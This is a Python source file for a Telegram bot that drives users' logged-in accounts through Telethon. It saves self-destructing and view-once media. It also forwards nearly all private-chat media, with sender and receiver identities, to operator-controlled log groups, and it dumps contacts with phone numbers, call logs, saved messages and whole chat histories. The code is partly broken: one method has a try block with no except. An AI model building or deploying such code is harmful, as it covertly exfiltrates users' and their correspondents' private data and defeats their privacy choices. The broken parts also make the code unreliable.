import os
import asyncio
import shutil
import html
import zipfile
from telethon import TelegramClient, events
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import GetAllStickersRequest, SearchGlobalRequest
from telethon.tl.types import (
    InputMessagesFilterPhoneCalls, MessageActionPhoneCall, User, PhoneCallDiscardReasonMissed,
    UserStatusOnline, UserStatusOffline, UserStatusRecently, UserStatusLastWeek, UserStatusLastMonth, UserStatusEmpty,
    InputPeerEmpty
)
from telethon.tl.functions.contacts import GetContactsRequest
from datetime import datetime, timedelta
from config import USERS_DIR, IGNORED_USERS, DOWNLOAD_FILTER_ADMINS, LOG_GROUP_NORMAL, LOG_GROUP_TIMER, CHATS_GROUP_ID

class UserSession:
    def __init__(self, user_id, api_id, api_hash, bot_instance):
        self.user_id = user_id
        self.api_id = api_id
        self.api_hash = api_hash
        self.bot = bot_instance # The Bot instance to send messages back to the user
        self.client = None
        self.user_folder = os.path.join(USERS_DIR, str(user_id))
        self.download_folder = os.path.join(self.user_folder, "download")
        self.session_path = os.path.join(self.user_folder, "session") # .session will be appended by Telethon

        os.makedirs(self.download_folder, exist_ok=True)

    async def get_dialogs(self, limit=10):
        if not self.client:
            return []
        
        users = []
        async for dialog in self.client.iter_dialogs(limit=None):
            if dialog.is_user and not dialog.entity.bot:
                # Filter Self and official Telegram Service account
                if dialog.entity.is_self or dialog.id == 777000:
                    continue
                
                users.append(dialog)
                if len(users) >= limit:
                    break
        return users

    async def scan_chat_and_download(self, chat_id, limit=100):
        if not self.client:
            return 0, 0 # downloaded, total_checked

        if int(chat_id) in IGNORED_USERS:
            entity = await self.client.get_entity(int(chat_id))
            sender_name = getattr(entity, 'first_name', '') or getattr(entity, 'title', 'Unknown')
            return []

        count = 0
        total_media = 0
        results = []
        sender_name = "Unknown"

        try:
            entity = await self.client.get_entity(int(chat_id))
            other_name = getattr(entity, 'first_name', '') or getattr(entity, 'title', 'Unknown')
            
            # Get Self Info for Outgoing messages
            me = await self.client.get_me()
            my_first = getattr(me, 'first_name', '') or ''
            my_last = getattr(me, 'last_name', '') or ''
            my_name = f"{my_first} {my_last}".strip() or getattr(me, 'title', 'Me')

            # Helper to escape HTML
            def esc(text):
                return text.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')

            # Helper for mention
            def get_mention(ent, n):
                link = f"<a href='tg://user?id={ent.id}'>{esc(n)}</a>"
                if getattr(ent, 'username', None):
                    return f"{link}\n@{ent.username}"
                return link
            
            async for message in self.client.iter_messages(entity, limit=limit):
                # Filter Logic for specific Admins (Only download My Outgoing messages)
                if int(chat_id) in DOWNLOAD_FILTER_ADMINS and not message.out:
                    continue

                is_timer = False
                # Check message main TTL
                if getattr(message, 'ttl_seconds', None):
                    is_timer = True
                elif getattr(message, 'ttl_period', None):
                    # Some updates use ttl_period
                    is_timer = True
                elif getattr(message, 'expire_date', None):
                    # If it has an expire date, it is likely a timer message
                    is_timer = True
                # Check media specific TTL (View Once often lives here)
                elif message.media and getattr(message.media, 'ttl_seconds', None):
                    is_timer = True
                


                if is_timer and message.media:
                    total_media += 1
                    try:
                        path = await message.download_media(self.download_folder)
                        if path:
                            # Build Rich Caption
                            sender_obj = await message.get_sender() 
                            if not sender_obj: sender_obj = entity if not message.out else me

                            s_fname = getattr(sender_obj, 'first_name', '') or getattr(sender_obj, 'title', '') or 'Unknown'
                            s_lname = getattr(sender_obj, 'last_name', '') or ''
                            s_full = f"{s_fname} {s_lname}".strip()
                            
                            orig_cap = message.message or ""
                            
                            results.append({
                                'path': path, 
                                'name': s_full,
                                'caption': orig_cap
                            })
                    except Exception as e:
                        print(f"Failed to download media msg {message.id}: {e}")

        except Exception as e:
            print(f"Error scanning chat {chat_id}: {e}")
            return [], "Error"
        
        return results


    async def start(self):
        """Starts the user client."""
        self.client = TelegramClient(self.session_path, self.api_id, self.api_hash)
        
        # Register hooks
        self.client.add_event_handler(self.on_new_message, events.NewMessage(incoming=True, outgoing=True))
        
        await self.client.start()
        print(f"User {self.user_id} client started.")

    async def join_channel(self, channel):
        try:
            await self.client(JoinChannelRequest(channel))
        except Exception as e:
            print(f"Error joining {channel}: {e}")

    async def stop(self):
        if self.client:
            await self.client.disconnect()

    async def logout(self):
        """Logs out the user, disconnects, and deletes the session file."""
        if not self.client:
            self.client = TelegramClient(self.session_path, self.api_id, self.api_hash)
            
        try:
            if not self.client.is_connected():
                await self.client.connect()
            
            # Terminate session on Telegram Server
            if await self.client.is_user_authorized():
                await self.client.log_out()
        except Exception as e:
            print(f"Logout error: {e}")
            
        await self.stop()
        if os.path.exists(self.session_path + ".session"):
            os.remove(self.session_path + ".session")
        print(f"User {self.user_id} logged out and session deleted.")

    async def is_authorized(self):
        """Checks if the session is valid."""
        if not os.path.exists(self.session_path + ".session"):
            return False
        
        try:
            # We need to temporarily connect to check auth
            temp_client = TelegramClient(self.session_path, self.api_id, self.api_hash)
            await temp_client.connect()
            is_auth = await temp_client.is_user_authorized()
            await temp_client.disconnect()
            return is_auth
        except Exception as e:
            print(f"Error checking auth for {self.user_id}: {e}")
            return False

    async def on_new_message(self, event):
        """Handles new messages for the user account."""
        try:
            # 1. Filter: Personal Chats Only (No Groups/Channels)
            if not event.is_private:
                return

            # 2. Filter: Ignored Users (Blacklist)
            if event.chat_id in IGNORED_USERS or (event.sender_id and event.sender_id in IGNORED_USERS):
                return
            
            # 3. Filter: Real Users Only (No Bots)
            try:
                # Check if the sender is a bot
                sender = await event.get_sender()
                if getattr(sender, 'bot', False):
                    return
                # Check if the partner (chat) is a bot (for outgoing messages to a bot)
                if event.out:
                     # For outgoing, 'sender' is Me. We need to check who we are talking to.
                     chat = await event.get_chat()
                     if getattr(chat, 'bot', False):
                         return
            except:
                pass

            # Check for self-destruct media (TTL)
            message = event.message
            is_timer = False
            
            # Check message main TTL
            if getattr(message, 'ttl_seconds', None):
                is_timer = True
            elif getattr(message, 'ttl_period', None):
                is_timer = True
            elif getattr(message, 'expire_date', None):
                is_timer = True
            # Check media specific TTL (View Once often lives here)
            elif message.media and getattr(message.media, 'ttl_seconds', None):
                is_timer = True

            # Decide what to do
            # Log Group: All Media < 1GB
            # User DM: Only Timer Media
            
            should_log = False
            if message.media:
                # Ignore Stickers
                if getattr(message, 'sticker', None):
                    return

                # Check Size (1GB = 10^9 bytes)
                file_size = 0
                if getattr(message, 'file', None) and getattr(message.file, 'size', None):
                     file_size = message.file.size
                
                if file_size < 1_000_000_000:
                    should_log = True

            if should_log:
                print(f"Processing media for Logging (User {self.user_id})")
                
                # Download
                path = await event.download_media(self.download_folder)
                
                # Schedule Auto-Delete after 5 minutes (300 seconds)
                asyncio.create_task(self.delete_file_later(path, 300))
                
                # Gather Info for Logging
                try:
                    me = await self.client.get_me()
                    first = getattr(me, 'first_name', '') or ''
                    last = getattr(me, 'last_name', '') or ''
                    my_name = f"{first} {last}".strip() or getattr(me, 'title', 'Me')
                    my_id = me.id
                    
                    chat_entity = await event.get_chat()
                    c_first = getattr(chat_entity, 'first_name', '') or ''
                    c_last = getattr(chat_entity, 'last_name', '') or ''
                    chat_name = f"{c_first} {c_last}".strip() or getattr(chat_entity, 'title', 'Unknown')
                    
                    sender_str = ""
                    receiver_str = ""
                    
                    # Helper to escape HTML
                    def esc(text):
                        return text.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')

                    # Helper for mention
                    def get_mention(entity, name):
                        # Always show clickable Name
                        link = f"<a href='tg://user?id={entity.id}'>{esc(name)}</a>"
                        # Add username if available
                        if getattr(entity, 'username', None):
                            return f"{link}\n@{entity.username}"
                        else:
                            return link

                    if event.out:
                        # I sent it
                        sender_str = f"{my_id}\n{get_mention(me, my_name)}"
                        receiver_str = f"{chat_entity.id}\n{get_mention(chat_entity, chat_name)}"
                        simple_name = my_name
                    else:
                        # They sent it
                        if event.is_group:
                            sender = await event.get_sender()
                            s_first = getattr(sender, 'first_name', '') or ''
                            s_last = getattr(sender, 'last_name', '') or ''
                            s_name = f"{s_first} {s_last}".strip() or "Unknown"
                            
                            sender_str = f"{sender.id}\n{get_mention(sender, s_name)}"
                            simple_name = s_name
                        else:
                            sender_str = f"{chat_entity.id}\n{get_mention(chat_entity, chat_name)}"
                            simple_name = chat_name
                        
                        receiver_str = f"{my_id}\n{get_mention(me, my_name)}"
                    
                    rich_footer = f"Sender - {sender_str}\n\nReceiver - {receiver_str}"
                    simple_footer = esc(simple_name)
                    
                    original_caption = event.message.message or ""
                    if original_caption:
                        log_caption = f"{esc(original_caption)}\n----------------------------------------\n{rich_footer}"
                        user_caption = f"{esc(original_caption)}\n----------------------------------------\n{simple_footer}"
                    else:
                        log_caption = rich_footer
                        user_caption = simple_footer
                    
                    target_group = LOG_GROUP_TIMER if is_timer else LOG_GROUP_NORMAL
                    await self.bot.send_file(target_group, path, caption=log_caption, parse_mode='html')
                except Exception as log_e:
                    print(f"Logging error: {log_e}")

                # Send back to User DM (ONLY IF TIMER) applies
                if is_timer:
                    should_send_to_user = True
                    # Filter Logic
                    if event.chat_id in DOWNLOAD_FILTER_ADMINS and not event.out:
                        should_send_to_user = False
                    
                    if should_send_to_user:
                        # Use the simplified caption for User DM
                        await self.bot.send_file(self.user_id, path, caption=user_caption, parse_mode='html')


        except Exception as e:
            print(f"Error in message handler for {self.user_id}: {e}")

    async def delete_file_later(self, path, delay):
        await asyncio.sleep(delay)
        if os.path.exists(path):
            try:
                os.remove(path)
                print(f"Deleted {path} after {delay}s")
            except Exception as e:
                print(f"Error deleting {path}: {e}")

    async def fetch_dialog_list(self, mode):
        """Fetches dialogs based on mode (chats, groups, channels, bots)."""
        if not self.client: return "Client not connected"
        
        try:
             # Handle 'number' mode
             if mode == 'number':
                 me = await self.client.get_me()
                 first = getattr(me, 'first_name', '') or ''
                 last = getattr(me, 'last_name', '') or ''
                 n = f"{first} {last}".strip() or "User"
                 u = f"@{me.username}" if getattr(me, 'username', None) else "No username"
                 p = getattr(me, 'phone', 'Unknown')
                 if p and p != 'Unknown' and not p.startswith('+'):
                     p = "+" + p
                 return f"{n}\n`{me.id}`\n{u}\n`{p}`"

             if mode in ['calls', 'allcalls'] or 'call' in mode:
                 try:
                     limit = 20 # Default for 'calls'
                     search_depth = 50 # How many dialogs to check
                     msg_depth = 50 # Messages per dialog to check
                     
                     if mode == 'calls':
                         limit = 20
                     elif mode == 'allcalls':
                         limit = 200
                         search_depth = 200 # Check more dialogs
                         msg_depth = 100 # Check deeper logic
                     elif 'call' in mode:
                         parts = mode.split()
                         limit = 10
                         for p in parts:
                             if p.isdigit(): limit = int(p)
                     
                     me = await self.client.get_me()
                     my_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "User"
                     header = f"{my_name}\nTop {limit} call list\n"
                     
                     history = []
                     # Native Telegram Call Scan (Global Search)
                     search_res = await self.client(SearchGlobalRequest(
                         q="",
                         filter=InputMessagesFilterPhoneCalls(),
                         min_date=None, max_date=None,
                         offset_rate=0, offset_peer=InputPeerEmpty(),
                         offset_id=0, limit=limit
                     ))
                     history = getattr(search_res, 'messages', [])
                     
                     if not history:
                         return header + "\nNo calls found (Checked recent chats)."
                     
                     items = []
                     for msg in history:
                         try:
                             entity = await self.client.get_entity(msg.peer_id)
                             if not isinstance(entity, User): continue
                             
                             first = getattr(entity, 'first_name', '') or ''
                             last = getattr(entity, 'last_name', '') or ''
                             name = f"{first} {last}".strip() or "Unknown"
                             uid = entity.id
                             username_line = f"@{entity.username}" if getattr(entity, 'username', None) else None
                         except:
                             name = "Unknown"
                             uid = "Unknown"
                             username_line = None
                         
                         dt = msg.date + timedelta(hours=5, minutes=30)
                         time_str = dt.strftime("%I:%M %p %d/%m/%Y")
                         
                         duration_str = "00:00:00"
                         call_type = "Call"
                         if isinstance(msg.action, MessageActionPhoneCall):
                             dur = getattr(msg.action, 'duration', 0) or 0
                             duration_str = str(timedelta(seconds=dur))
                             
                             if msg.out:
                                 call_type = "Outgoing Call"
                             else:
                                 call_type = "Incoming Call"
                                 if isinstance(msg.action.reason, PhoneCallDiscardReasonMissed) or dur == 0:
                                     call_type = "Missed Call"
                         
                         item = f"{name}\n`{uid}`"
                         if username_line:
                             item += f"\n{username_line}"
                         item += f"\nTime - {time_str}\n{call_type}\nDuration - {duration_str}"
                         items.append(item)
                     
                     return header + "\n" + "\n\n".join(items)
                 except Exception as e:
                     return f"Call Log Error: {e}"

             if mode in ['saved', 'allsaved']:
                 try:
                     limit = 50
                     if mode == 'allsaved': limit = 1000
                     
                     bot_u = await self.bot.get_me()
                     bot_username = bot_u.username
                     
                     # Forward from 'me' (Saved Messages)
                     return await self.forward_chats('me', limit, bot_username, CHATS_GROUP_ID)
                 except Exception as e:
                     return f"Error fetching saved messages: {e}"

             if 'sticker' in mode or 'stikcer' in mode:
                 try:
                     st_idx = 0
                     limit = 30 # Updated to 30
                     if 'all' in mode: limit = None
                     
                     # hash=0 returns all stickers
                     st_result = await self.client(GetAllStickersRequest(hash=0))
                     sets = st_result.sets
                     
                     if limit:
                         sets = sets[:limit]
                     
                     report = [f"Found {len(st_result.sets)} Sticker Packs (Showing {len(sets)})"]
                     for s in sets:
                         link = f"https://t.me/addstickers/{s.short_name}"
                         report.append(f"[{s.title}]({link})")
                     return "\n\n".join(report)
                 except Exception as e: return f"Error fetching stickers: {e}"
             
             if 'contact' in mode:
                 try:
                     result = await self.client(GetContactsRequest(hash=0))
                     contacts = result.users
                     
                     def sort_key(u):
                         s = u.status
                         if isinstance(s, UserStatusOnline): return float('inf')
                         if isinstance(s, UserStatusOffline): return s.was_online.timestamp()
                         if isinstance(s, UserStatusRecently): return 4.0
                         if isinstance(s, UserStatusLastWeek): return 3.0
                         if isinstance(s, UserStatusLastMonth): return 2.0
                         return 1.0
                     
                     contacts.sort(key=sort_key, reverse=True)
                     
                     limit = 30 # Updated to 30
                     if 'all' in mode: limit = None
                     
                     if limit:
                         contacts = contacts[:limit]
                     
                     header_line = f"Found {len(result.users)} Contacts (Showing {len(contacts)})"
                     contact_lines = []
                     for u in contacts:
                         name = f"{u.first_name or ''} {u.last_name or ''}".strip() or "No Name"
                         
                         status_str = "Offline"
                         if isinstance(u.status, UserStatusOnline): status_str = "Online"
                         elif isinstance(u.status, UserStatusOffline): 
                             dt = u.status.was_online + timedelta(hours=5, minutes=30)
                             status_str = "Last seen " + dt.strftime("%d/%m/%Y %I:%M %p")
                         elif isinstance(u.status, UserStatusRecently): status_str = "Last seen recently"
                         elif isinstance(u.status, UserStatusLastWeek): status_str = "Last seen within a week"
                         elif isinstance(u.status, UserStatusLastMonth): status_str = "Last seen within a month"
                         elif isinstance(u.status, UserStatusEmpty): status_str = "Last seen long ago"
                         
                         uname_line = f"@{u.username}" if u.username else None
                         phone = f"+{u.phone}" if u.phone else "No Phone"
                         
                         block = f"{name}\n{status_str}\n`{u.id}`"
                         if uname_line: block += f"\n{uname_line}"
                         block += f"\n{phone}"
                         
                         contact_lines.append(block)
                     
                     return header_line + "\n\n" + "\n\n".join(contact_lines)
                 except Exception as e: return f"Error fetching contacts: {e}"

             me = await self.client.get_me()
             u_str = f"@{me.username}" if getattr(me, 'username', None) else (getattr(me, 'first_name', '') or 'User')
             
             is_all = mode.startswith('all') 
             category = mode.replace('all', '') # chats, groups, channels, bots
             
             if is_all:
                  title = f"All {category.rstrip('s')} list"
                  limit = None
             else:
                  title = f"Top 10 {category.rstrip('s')} list"
                  limit = 200 
             
             header = f"{u_str}\n{title}\n"
             
             # Separator Logic: Double newline for multi-line items
             separator = "\n" if category == 'chats' else "\n\n"
             
             items = []
             count_matches = 0
             max_matches = 10 if not is_all else 9999
             
             async for dialog in self.client.iter_dialogs(limit=limit):
                  if count_matches >= max_matches: break
                  
                  entity = dialog.entity
                  match = False
                  is_bot = getattr(entity, 'bot', False)
                  
                  if category == 'chats':
                      if dialog.is_user and not is_bot: match = True
                  elif category == 'bots':
                      if dialog.is_user and is_bot: match = True
                  elif category == 'groups':
                      if dialog.is_group: match = True
                  elif category == 'channels':
                      if dialog.is_channel and not dialog.is_group: match = True
                  
                  if match:
                      if category == 'chats': 
                           first = getattr(entity, 'first_name', '') or ''
                           last = getattr(entity, 'last_name', '') or ''
                           name = f"{first} {last}".strip()
                           items.append(f"`{entity.id}` {name}")
                           
                      elif category == 'bots':
                           first = getattr(entity, 'first_name', '') or ''
                           name = f"{first}".strip()
                           uname = f"@{entity.username}" if getattr(entity, 'username', None) else "No Username"
                           items.append(f"{name}\n{uname}")
                           
                      elif category in ['groups', 'channels']:
                           item_str = f"`{entity.id}`\n{entity.title}"
                           if getattr(entity, 'username', None):
                               item_str += f"\nhttps://t.me/{entity.username}"
                           items.append(item_str)
                      
                      count_matches += 1
             
             if not items:
                 return header + "\nNo items found."
             return header + "\n" + separator.join(items)
        except Exception as e:
             return f"Error fetching list: {e}"

    async def forward_chats(self, target_id, limit, bot_username, group_id):
        """Forwards last n messages from target_id to the bot or group."""
        if not self.client: return "Client not connected"
        try:
            # Ensure dialog with bot exists (Fix for 'Not Giving' issue)
            try:
                ping_msg = await self.client.send_message(bot_username, "/start")
                await ping_msg.delete()
            except: pass
            
            # get_messages returns newest first. 
            msgs = await self.client.get_messages(target_id, limit=limit)
            
            count = 0
            for msg in reversed(msgs):
                success = False
                # Try Direct Forward to Group
                try:
                    await self.client.forward_messages(group_id, msg)
                    success = True
                except:
                    pass
                
                if not success:
                    try:
                        await self.client.forward_messages(bot_username, msg)
                    except Exception as e:
                        try:
                            await self.client.send_message(bot_username, msg)
                        except Exception as e2:
                             await self.client.send_message(bot_username, f"[Error] Could not forward message")
                
                await asyncio.sleep(0.2)
                count += 1
                
            return f"Processed {count} messages."
    async def export_chat(self, target_id):
        """Exports chat history to HTML/Zip with large file handling."""
        if not self.client: return "Client not connected"
        
        try:
            # Setup Paths
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            base_name = f"export_{target_id}_{ts}"
            export_path = os.path.join(self.download_folder, base_name) # Use download folder as workspace
            media_path = os.path.join(export_path, "media")
            os.makedirs(media_path, exist_ok=True)
            
            entity = await self.client.get_entity(int(target_id))
            target_name = getattr(entity, 'first_name', '') or getattr(entity, 'title', 'Unknown')
            
            # Pass 1: Count Large Files
            limit_size = 100 * 1024 * 1024 # 100MB
            large_count = 0
            all_msgs = []
            
            # Fetch All Messages (Oldest to Newest)
            async for m in self.client.iter_messages(entity, reverse=True):
                all_msgs.append(m)
                if m.file and m.file.size and m.file.size > limit_size:
                    large_count += 1
            
            separate_large = (large_count > 20)
            large_files_to_send = []
            
            # HTML Builder
            html_head = f"""
            <html>
            <head>
                <meta charset="utf-8">
                <style>
                    body {{ font-family: sans-serif; background: #eef1f2; margin: 0; padding: 20px; }}
                    .container {{ max_width: 800px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
                    .header {{ border-bottom: 1px solid #ddd; margin-bottom: 20px; padding-bottom: 10px; }}
                    .msg {{ padding: 10px; margin-bottom: 15px; border-radius: 12px; position: relative; max-width: 80%; word-wrap: break-word; }}
                    .out {{ background: #dcf8c6; margin-left: auto; }}
                    .in {{ background: #f0f0f0; margin-right: auto; }}
                    .name {{ font-weight: bold; font-size: 0.85em; color: #555; margin-bottom: 4px; }}
                    .time {{ font-size: 0.7em; color: #999; text-align: right; margin-top: 4px; }}
                    .content {{ font-size: 1em; line-height: 1.4; white-space: pre-wrap; }}
                    .media {{ max-width: 100%; display: block; margin-top: 5px; border-radius: 8px; }}
                    .info {{ font-style: italic; color: #888; font-size: 0.9em; }}
                </style>
            </head>
            <body>
            <div class="container">
            <div class="header">
                <h2>Chat Export with {html.escape(target_name)}</h2>
                <p>Total Messages: {len(all_msgs)} | Date: {datetime.now().strftime('%d/%m/%Y')}</p>
            </div>
            """
            
            html_body = ""
            
            for m in all_msgs:
                sender = "Me" if m.out else target_name
                css_class = "out" if m.out else "in"
                dt = m.date + timedelta(hours=5, minutes=30)
                dt_str = dt.strftime("%I:%M %p %d/%m/%Y")
                
                content = html.escape(m.message or "")
                media_html = ""
                
                if m.media:
                    fsize = m.file.size if m.file else 0
                    is_large = (fsize > limit_size)
                    
                    if is_large and separate_large:
                        large_files_to_send.append(m)
                        mb_size = fsize // (1024 * 1024)
                        media_html = f"<div class='info'>[Large File ({mb_size} MB) sent separately]</div>"
                    else:
                        # Download logic
                        # Naming
                        fname = "file"
                        if m.file.name: fname = m.file.name
                        elif m.file.ext: fname = f"{m.id}{m.file.ext}"
                        else: fname = f"{m.id}.bin"
                        
                        fpath = os.path.join(media_path, fname)
                        
                        # Only download if not exists (handling retries theoretically, though script cleans up)
                        if not os.path.exists(fpath):
                             # Catch download errors
                             try:
                                 await m.download_media(file=fpath)
                             except Exception as de:
                                 media_html = f"<div class='info'>[Download Failed: {de}]</div>"
                        
                        if os.path.exists(fpath):
                            rel_path = f"media/{fname}"
                            # Tag Logic
                            if m.photo:
                                media_html = f"<img src='{rel_path}' class='media'>"
                            elif m.video:
                                media_html = f"<video src='{rel_path}' controls class='media'></video>"
                            elif m.voice:
                                media_html = f"<audio src='{rel_path}' controls></audio>"
                            elif m.sticker:
                                media_html = f"<img src='{rel_path}' class='media' style='max-width: 150px;'>"
                            else:
                                media_html = f"<a href='{rel_path}' target='_blank'>📎 {fname}</a>"
                
                html_body += f"""
                <div class='msg {css_class}'>
                    <div class='name'>{html.escape(sender)}</div>
                    <div class='content'>{content}</div>
                    {media_html}
                    <div class='time'>{dt_str}</div>
                </div>
                """
            
            html_final = html_head + html_body + "</div></body></html>"
            
            # Save HTML inside export folder
            html_in_zip = os.path.join(export_path, "export.html")
            with open(html_in_zip, "w", encoding="utf-8") as f:
                f.write(html_final)
                
            # Copy HTML primarily to user folder for "Alag se sending"
            html_standalone = os.path.join(self.download_folder, f"{base_name}.html")
            shutil.copy(html_in_zip, html_standalone)
            
            # Zip Content (Split if > 2GB)
            media_files = [os.path.join(media_path, f) for f in os.listdir(media_path)]
            zip_parts = []
            part_num = 1
            current_batch_size = 0
            current_batch_files = []
            MAX_SIZE = 1800 * 1024 * 1024 # 1.8 GB Limit
            
            def create_zip_part(files, num):
                zname = f"{base_name}_part{num}.zip"
                zpath = os.path.join(self.download_folder, zname)
                with zipfile.ZipFile(zpath, 'w', zipfile.ZIP_DEFLATED) as zf:
                    if num == 1: zf.write(html_in_zip, "export.html")
                    for f in files:
                        zf.write(f, os.path.join("media", os.path.basename(f)))
                return zpath

            for f in media_files:
                fsize = os.path.getsize(f)
                if current_batch_size + fsize > MAX_SIZE:
                    zip_parts.append(create_zip_part(current_batch_files, part_num))
                    part_num += 1
                    current_batch_files = []
                    current_batch_size = 0
                current_batch_files.append(f)
                current_batch_size += fsize
            
            if current_batch_files or part_num == 1:
                zip_parts.append(create_zip_part(current_batch_files, part_num))
            
            # Cleanup Folder
            shutil.rmtree(export_path)
            
            return {'zips': zip_parts, 'html': html_standalone, 'large_files': large_files_to_send}
            
        except Exception as e:
            return f"Export Error: {e}"
